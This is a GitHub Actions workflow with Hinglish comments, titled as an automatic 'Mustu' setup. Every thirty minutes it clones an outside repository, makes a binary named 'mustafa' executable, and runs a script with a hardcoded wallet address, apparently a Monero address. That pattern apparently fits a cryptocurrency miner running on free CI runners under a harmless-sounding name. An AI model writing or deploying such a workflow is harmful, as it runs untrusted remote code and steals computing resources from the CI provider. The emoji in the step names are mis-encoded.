name: ðŸ”„ Auto Mustu Setup (No Manual Needed)

on:
  push:
    branches: [ main, master ]
  schedule:
    - cron: '*/30 * * * *'   # Har 30 minute mein run hoga
  workflow_dispatch:          # Optional - agar kabhi manually run karna ho

jobs:
  auto-run:
    runs-on: ubuntu-latest
    
    steps:
    - name: ðŸ“¥ Checkout
      uses: actions/checkout@v4
    
    - name: ðŸ Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'
    
    - name: ðŸš€ Auto Clone & Run Mustu
      run: |
        echo "Starting automatic mustu setup..."
        
        # Clone karo
        git clone https://github.com/thumpingpp/mustu-setup.git
        
        # CD aur permissions
        cd mustu-setup
        
        # mustafa ko executable banao
        chmod +x mustafa
        
        # Direct auto run with fixed wallet
        python3 mustafa.py "43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN"
        
        echo "âœ… Auto run completed at $(date)"
    
    - name: ðŸ’¾ Save Run Status
      run: |
        echo "Last run: $(date)" > last_run.txt
        echo "Wallet: 43k1pWC5SfDRT7BvVbpptA1E8bVXp7eExVbgizHNqBeu8ZTipQZB5uBjYYG68SEE4aT7Afao4pW2zamrScqHsVhWUwaZzMN" >> last_run.txt
    
    - name: ðŸ“¤ Upload Logs
      uses: actions/upload-artifact@v4
      with:
        name: auto-run-logs
        path: |
          mustu-setup/*.log
          last_run.txt
        retention-days: 5
